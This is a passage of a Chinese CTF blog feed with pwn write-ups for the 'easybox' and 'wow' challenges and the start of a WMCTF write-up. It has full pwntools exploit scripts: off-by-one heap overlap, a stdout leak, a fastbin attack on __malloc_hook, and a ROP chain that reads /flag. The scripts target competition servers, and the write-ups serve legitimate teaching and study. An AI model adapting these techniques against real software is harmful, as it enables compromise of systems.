class="line">print(<span class="string">"success"</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">11</span>, p64(libc_base + main_arena_offset + <span class="number">0x58</span>) * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># uaf</span></span><br><span class="line">add(<span class="number">80</span>, <span class="number">0x68</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 12</span></span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">edit(<span class="number">12</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">80</span>, <span class="number">0x68</span>, <span class="string">"BBBB"</span>) <span class="comment"># chunk 13</span></span><br><span class="line">add(<span class="number">80</span>, <span class="number">0x68</span>, <span class="string">"CCCC"</span>) <span class="comment"># chunk 14</span></span><br><span class="line">edit(<span class="number">14</span>, <span class="string">'\x00'</span> * <span class="number">0x13</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"please answer the question"</span>, str(<span class="number">80</span>))</span><br><span class="line">p.sendlineafter(<span class="string">'______?'</span>, str(<span class="number">0x38</span>))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line">p.sendline(token)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="easybox"><a href="#easybox" class="headerlink" title="easybox"></a>easybox</h1><p>思路和上一题一样。</p><ol><li><p>两个功能：</p><ul><li><p><code>add</code>：</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">      <span class="keyword">unsigned</span> __int64 <span class="built_in">size</span>; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">      <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">      v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"idx:"</span>);</span><br><span class="line">      v1 = choice();</span><br><span class="line">      <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"error."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"len:"</span>);</span><br><span class="line">      <span class="built_in">size</span> = choice();</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">size</span> &gt; <span class="number">0xFFF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"error."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      chunk_size[v1] = <span class="built_in">size</span> + <span class="number">1</span>;</span><br><span class="line">      chunk_array[v1] = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"content:"</span>);</span><br><span class="line">      <span class="built_in">read</span>(<span class="number">0</span>, chunk_array[v1], chunk_size[v1]);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  直接就是一个off by one。</p></li><li><p><code>delete</code>：</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"idx:"</span>);</span><br><span class="line">  v1 = choice();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> || !chunk_array[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"error."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(chunk_array[v1]);</span><br><span class="line">  chunk_array[v1] = <span class="number">0L</span>L;</span><br><span class="line">  chunk_size[v1] = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  删得很彻底。</p></li></ul></li><li><p>直接利用off by one，构造chunk overlap，因为没有<code>show</code>，所以同样使得同一个chunk同时存在于unsorted bin和fastbin（<code>size = 0x70</code>）中，这样<code>fastbin-&gt;fd = main_arena + 0x58</code>；然后partial write，bruteforce，write stdout， leak。</p></li><li><p>然后再利用chunk overlap，fastbin attack打<code>__malloc_hook</code>为<code>onegadget</code>即可。</p></li><li><p>exp仅供参考：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'101.200.53.148'</span>, <span class="number">34521</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, len, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"idx:"</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"len:"</span>, str(len))</span><br><span class="line">    p.sendafter(<span class="string">"content:"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"idx:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line">stdout_offset = <span class="number">0x3c5620</span></span><br><span class="line">__malloc_hook_offset = libc.sym[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0xf1207</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># chunk overlap</span></span><br><span class="line">        add(<span class="number">0</span>, <span class="number">0x28</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">        add(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        add(<span class="number">2</span>, <span class="number">0x68</span>, <span class="string">"CCCC"</span>)</span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line">        add(<span class="number">0</span>, <span class="number">0x28</span>, <span class="string">"A"</span> * <span class="number">0x28</span> + <span class="string">"\xa1"</span>)</span><br><span class="line">        add(<span class="number">3</span>, <span class="number">0x28</span>, <span class="string">"DDDD"</span>)</span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># partial write</span></span><br><span class="line">        add(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">"B"</span> * <span class="number">0x28</span> + <span class="string">"\x61"</span>)</span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line">        add(<span class="number">4</span>, <span class="number">0x58</span>, p64(stdout_offset - <span class="number">0x43</span>)[:<span class="number">2</span>])</span><br><span class="line">        add(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">"B"</span> * <span class="number">0x28</span> + <span class="string">"\x71"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># leak</span></span><br><span class="line">        add(<span class="number">5</span>, <span class="number">0x68</span>, <span class="string">"EEEE"</span>)</span><br><span class="line">        add(<span class="number">6</span>, <span class="number">0x68</span>, <span class="string">"\x00"</span> * <span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">"\x00"</span>)</span><br><span class="line">        p.recvline()</span><br><span class="line">        p.recv(<span class="number">0x40</span>)</span><br><span class="line">        libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x3c5600</span></span><br><span class="line">        __malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">        one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"Failed"</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        p = remote(<span class="string">'101.200.53.148'</span>, <span class="number">34521</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Success"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x28</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x28</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x68</span>, <span class="string">"CCCC"</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x28</span>, <span class="string">"A"</span> * <span class="number">0x28</span> + <span class="string">"\xa1"</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x28</span>, <span class="string">"DDDD"</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __malloc_hook</span></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x38</span>, <span class="string">"E"</span> * <span class="number">0x28</span> + p64(<span class="number">0x71</span>) + p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x68</span>, <span class="string">"FFFF"</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x68</span>, <span class="string">"G"</span> * <span class="number">0x13</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:"</span>, str(<span class="number">12</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"len:"</span>, str(<span class="number">0x48</span>))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__malloc_hook: "</span> + hex(__malloc_hook))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"token"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="wow"><a href="#wow" class="headerlink" title="wow"></a>wow</h1><p>主要就是逆向这个binary，搞清楚逻辑后难度就降低了。</p><ol><li><p>主要就是程序在栈上开辟了一块0x400的地址作为虚拟栈，然后指令就是<code>~@#$^&amp;|*{}</code>这几个，前面的几个很容易看出来就是对虚拟栈进行一些基本的操作，主要是后面这两个<code>{}</code>，队友说是像一些红黑树（实际上后来发现并不重要），重点在于：</p><ul><li><code>{</code>和<code>}</code>可以理解为条件跳转指令，如果当前虚拟栈上的值不为0，那么<code>{}</code>中间的指令就会得到执行。</li><li>执行到<code>}</code>的时候，同样检查虚拟栈上的值不为0的话，就会重新跳回<code>{</code>执行，相当于一个循环操作（这里可以解释为什么<code>~{}</code>指令会造成程序死循环了）。</li></ul></li><li><p>之后在这个基础上，尝试输入一些payload，发现<code>~{@~}</code>会打印出”\xFF\xFF\xFF\xFF”（在没有aslr的情况下），由于程序中打印code用的就是一个<code>code_buf</code>指针，这里显然是指针被改了。</p></li><li><p>调试后发现，原因在于执行过程中，存在一个1 byte溢出，将虚拟栈后面的指针低字节给覆盖了，而这个指针，正好就是指向输入的指令；那么，此时相当于我们可以修改指令buf的位置，向栈上附近的位置写入任意值。</p></li><li><p>同时可以发现：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0L</span>L, &amp;tmp, <span class="number">1L</span>L);</span><br><span class="line">    chr = tmp;</span><br><span class="line">    <span class="keyword">if</span> ( tmp == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    index = len;</span><br><span class="line">    len_inc = len + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( code_buf == (__int64 *)&amp;code )</span><br><span class="line">      v11 = <span class="number">15L</span>L;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v11 = code;</span><br><span class="line">    <span class="keyword">if</span> ( len_inc &gt; v11 )</span><br><span class="line">     <span class="built_in">realloc</span>(&amp;code_buf, len, <span class="number">0L</span>L, <span class="number">0L</span>L, <span class="number">1L</span>L);</span><br><span class="line">    *((_BYTE *)code_buf + index) = chr;</span><br><span class="line">    len = len_inc;</span><br><span class="line">    *((_BYTE *)code_buf + index + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 这里因为<code>code_buf</code>被改了，造成<code>code_buf == (__int64 *)&amp;code</code>没有满足，<code>v11</code>就被赋值为上一次输入的指令值了，也就是说就是一个很大的值，从而<code>realloc</code>不会因为指令的长度超过15而被调用从而将<code>code_buf</code>指向heap上。</p></li><li><p>因此，利用的思路就很清晰了，就是利用溢出将<code>code_buf</code>指向<code>return address</code>，然后写入orw的rop拿flag，但是需要注意的，避开地址包含有效指令的gadget（或者进行计算）。</p></li><li><p>这样rop打return address后发现还是会crash，其实程序还有个检查<code>code_buf</code>的位置：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( code_buf != (__int64 *)&amp;code )</span><br><span class="line">sub_405C90((__int64)code_buf);</span><br></pre></td></tr></table></figure><p> 也就是说要绕过这个check，还必须将<code>code_buf</code>改回来，那么其实可以在rop的末尾添加指令改回来即可（因为解析指令的时候如果遇到非指令字符是会跳过的）。</p></li><li><p>改回来后再触发rop即可。</p></li><li><p><code>exp</code>仅供参考：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'101.200.53.148'</span>, <span class="number">15324</span>)</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x00000000004dc054</span> <span class="comment"># syscall ; ret</span></span><br><span class="line">pop_rdi = <span class="number">0x000000000041307a</span> <span class="comment"># pop rdi ; pop ...; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000047383d</span> <span class="comment"># pop rsi ; pop ...; ret</span></span><br><span class="line">pop_rdx = <span class="number">0x000000000053048b</span> <span class="comment"># pop rdx ; pop ...; ret</span></span><br><span class="line">pop_rax = <span class="number">0x000000000053048a</span> <span class="comment"># pop rax ; pop ...; pop ...; ret</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call</span><span class="params">(rax, rdi=<span class="number">0</span>, rsi=<span class="number">0</span>, rdx=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> flat([pop_rax, rax, <span class="number">0</span>, <span class="number">0</span>, pop_rdi, rdi, <span class="number">0</span>, pop_rsi, rsi, <span class="number">0</span>, pop_rdx, rdx, <span class="number">0</span>, syscall])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"enter your code:\n"</span>, <span class="string">"~&#123;@&amp;$&#125;"</span>)</span><br><span class="line">p.send(<span class="string">"A"</span> * <span class="number">0x3FF</span>)</span><br><span class="line">p.recvuntil(<span class="string">"\nrunning....\n"</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.recvuntil(<span class="string">"\x00"</span> * <span class="number">0x3FF</span>)</span><br><span class="line">val = ord(p.recv(<span class="number">1</span>))</span><br><span class="line">p.send(chr((val + <span class="number">0x58</span>) &amp; <span class="number">0xFF</span>))</span><br><span class="line">p.sendafter(<span class="string">"continue?"</span>, <span class="string">"Y"</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = call(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0x5D3700</span>, <span class="number">0x10</span>)</span><br><span class="line">payload += call(<span class="number">2</span>, <span class="number">0x5D3700</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload += call(<span class="number">0</span>, <span class="number">3</span>, <span class="number">0x5D3700</span> + <span class="number">0x10</span>, <span class="number">0x50</span>)</span><br><span class="line">payload += call(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0x5D3700</span> + <span class="number">0x10</span>, <span class="number">0x50</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"enter your code:\n"</span>, payload + <span class="string">"~&#123;@&amp;$&#125;"</span>)</span><br><span class="line">p.send(<span class="string">"A"</span> * <span class="number">0x3FF</span>)</span><br><span class="line">p.send(chr(val))</span><br><span class="line">p.sendafter(<span class="string">"continue?"</span>, <span class="string">"N"</span>)</span><br><span class="line">p.send(<span class="string">"/flag\x00"</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文首发于安全客：&lt;a href=&quot;https://www.anquanke.com/post/id/215100&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/215100&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;pwn题全都没给libc，不过好在nofree那道题搞出来之后直接查出来libc的版本，后面就轻松很多了。wow这道题搞了很久，主要代码太长看得有点心累，再看解出题的队伍蛮多的就死磕了。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Competition" scheme="https://n0nop.com/categories/Competition/"/>
    
    
      <category term="CTF" scheme="https://n0nop.com/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>WMCTF 部分pwn题解</title>
    <link href="https://n0nop.com/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/"/>
    <id>https://n0nop.com/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/</id>
    <published>2020-08-07T16:10:27.000Z</published>
    <updated>2020-12-03T03:35:06.258Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/212563" target="_blank" rel="noopener">https://www.anquanke.com/post/id/212563</a></p><p>两天摸了三个pwn，剩下的cfgo-LuckyMaze，IDA反编译出来的代码实在太难看了，水平有限；baby_mac确实有相关的分析文章，无奈没有环境只能放弃。剩下三个好好总结一下。</p><a id="more"></a><h1 id="mengyedekending"><a href="#mengyedekending" class="headerlink" title="mengyedekending"></a>mengyedekending</h1><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li><p>题目给了一个baby_Cat.exe以及一大堆dll，直接IDA分析baby_Cat.exe会发现找不到什么明显的逻辑，但是可以从一些类似字符串信息比如：</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803094211088.png" alt="image-20200803094211088"></p><p>可以猜测出这个exe实际上是在加载dll，程序主要的逻辑就在加载的dll中执行。</p></li><li><p>查看题目给的一堆dll中，会发现exe同名的baby_Cat.dll，用dnSpy x86反编译，成功定位到关键函数：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">unsafe</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* ptr = <span class="keyword">stackalloc</span> <span class="keyword">char</span>[(UIntPtr)<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span>* ptr2 = (<span class="keyword">int</span>*)(ptr + <span class="number">50</span>);</span><br><span class="line">    Program @<span class="keyword">object</span> = <span class="keyword">new</span> Program();</span><br><span class="line">    Program.MsgHandler msgHandler = <span class="keyword">new</span> Program.MsgHandler(@<span class="keyword">object</span>.Right);</span><br><span class="line">    Program.MsgHandler msgHandler2 = <span class="keyword">new</span> Program.MsgHandler(@<span class="keyword">object</span>.Backdoor);</span><br><span class="line">    Console.WriteLine(<span class="string">"This is a gift for you : &#123;0:x4&#125;"</span>, &amp;num);</span><br><span class="line">    Console.WriteLine(<span class="string">"What do you want me to repeat?"</span>);</span><br><span class="line">    ptr2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    ptr2[<span class="number">2</span>] = ptr;</span><br><span class="line">    *ptr2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (ptr2[<span class="number">1</span>] &lt; <span class="number">53</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> c = (<span class="keyword">char</span>)Console.Read();</span><br><span class="line">        <span class="keyword">bool</span> flag = c == <span class="string">'\n'</span>;</span><br><span class="line">        <span class="keyword">if</span> (flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">bool</span> flag2 = c == <span class="string">'\r'</span>;</span><br><span class="line">        <span class="keyword">if</span> (!flag2)</span><br><span class="line">        &#123;</span><br><span class="line">            ptr[*ptr2] = c;</span><br><span class="line">            ptr2[<span class="number">1</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        (*ptr2)++;</span><br><span class="line">    &#125;</span><br><span class="line">    Console.WriteLine(<span class="string">"Do you want to change your input?"</span>);</span><br><span class="line">    <span class="keyword">char</span> c2 = (<span class="keyword">char</span>)Console.Read();</span><br><span class="line">    <span class="keyword">bool</span> flag3 = c2 == <span class="string">'N'</span> || c2 == <span class="string">'n'</span>;</span><br><span class="line">    <span class="keyword">if</span> (flag3)</span><br><span class="line">    &#123;</span><br><span class="line">        msgHandler(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">"Please tell me a offset!"</span>);</span><br><span class="line">        <span class="keyword">char</span>* ptr3 = ptr2[<span class="number">2</span>];</span><br><span class="line">        Console.ReadLine();</span><br><span class="line">        <span class="keyword">int</span> num2 = Console.Read();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num2; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span>* ptr4 = ptr3 + i;</span><br><span class="line">            *ptr4 -= <span class="string">'\u0001'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">bool</span> flag4 = num == <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (flag4)</span><br><span class="line">        &#123;</span><br><span class="line">            msgHandler(ptr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            msgHandler2(ptr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>可以看到逻辑很简单，申请了一个大小为100的字符串数组<code>ptr</code>，其中当前数组的<code>index</code>信息储存在<code>ptr[50]</code>的位置，而<code>ptr[51]</code>储存的是接受的字符个数。</p></li><li><p>而至于这个<code>msgHandler</code>和<code>msgHandler2</code>，他们分别是：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 